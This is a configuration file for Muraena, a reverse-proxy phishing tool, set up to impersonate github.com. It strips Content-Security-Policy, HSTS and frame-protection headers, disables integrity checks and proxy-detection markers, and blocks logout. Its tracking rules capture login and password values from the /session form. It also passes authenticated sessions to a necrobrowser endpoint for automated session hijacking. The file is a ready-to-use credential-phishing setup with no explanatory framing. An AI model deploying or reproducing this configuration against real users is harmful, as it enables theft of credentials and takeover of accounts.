{
  "proxy": {
    "phishing": "test.muraena",
    "destination": "github.com",

    "listener": {
      "ip": "0.0.0.0",
      "port": 443,
      "HTTPtoHTTPS": {
        "enabled": true,
        "HTTPport": 80
      }
    },

    "skipContentType": [
      "font/*",
      "image/*"
    ],
    "transform": {
      "base64": {
        "enabled": false,
        "padding": [
          "=",
          "."
        ]
      },
      "request": {
        "header": [
          "Cookie",
          "Referer",
          "Origin",
          "X-Forwarded-For"
        ]
      },
      "response": {
        "header": [
          "Location",
          "WWW-Authenticate",
          "Origin",
          "Set-Cookie",
          "Access-Control-Allow-Origin"
        ],
        "custom": [
          [
            "integrity=\"",
            "no-integrity=\""
          ],
          [
            "js-proxy-site-detection-payload",
            ""
          ],
          [
            "expected-hostname",
            ""
          ],
          [
            "html-safe-nonce",
            ""
          ]
        ]
      }
    },
    "remove": {
      "request": {
        "header": [
          "X-Forwarded-For"
        ]
      },
      "response": {
        "header": [
          "Content-Security-Policy",
          "Content-Security-Policy-Report-Only",
          "Strict-Transport-Security",
          "X-XSS-Protection",
          "X-Content-Type-Options",
          "X-Frame-Options",
          "Referrer-Policy",
          "X-Forwarded-For"
        ]
      }
    },
    "drop": [
      {
        "url": "/logout",
        "redirectTo": "https://github.com"
      }
    ],
    "log": {
      "enabled": true,
      "filePath": "muraena.log"
    }
  },
  "tls": {
    "enabled": true,
    "expand": false,
    "certificate": "./config/cert.pem",
    "key": "./config/privkey.pem",
    "root": "./config/fullchain.pem"
  },
  "crawler": {
    "enabled": false,
    "depth": 3,
    "upto": 20,
    "externalOriginPrefix": "www-",
    "externalOrigins": [
      "*.githubassets.com",
      "*.githubusercontent.com",
      "*.github.io",
      "github-cloud.s3.amazonaws.com",
      "*.githubapp.com",
      "octocaptcha.com",
      "stats.g.doubleclick.net",
      "github.community",
      "atom.io",
      "electron.atom.io",
      "githubstatus.com",
      "github.blog",
      "git-merge.com",
      "githubsatellite.com",
      "githubcampus.expert",
      "githubengineering.com",
      "jekyllrb.com"
    ]
  },
  "necrobrowser": {
    "enabled": true,
    "endpoint": "http://necrobrowser.url/xyz",
    "profile": "./config/instrument.github.necro"
  },
  "staticServer": {
    "enabled": false,
    "port": 8080,
    "localPath": "./static/",
    "urlPath": "/evilpath/"
  },
  "tracking": {
    "enabled": true,
    "identifier": "_gat",
    "regex": "[a-zA-Z0-9]{5}",
    "domain": "",
    "ipSource": "",
    "urls": {
      "credentials": [
        "/session"
      ],
      "authSession": [
        "/settings/profile"
      ]
    },
    "params": [
      "login",
      "password"
    ],
    "patterns": [
      {
        "label": "Username",
        "matching": "login",
        "start": "login=",
        "end": "&password="
      },
      {
        "label": "Password",
        "matching": "password",
        "start": "password=",
        "end": "&webauthn"
      }
    ]
  }
}
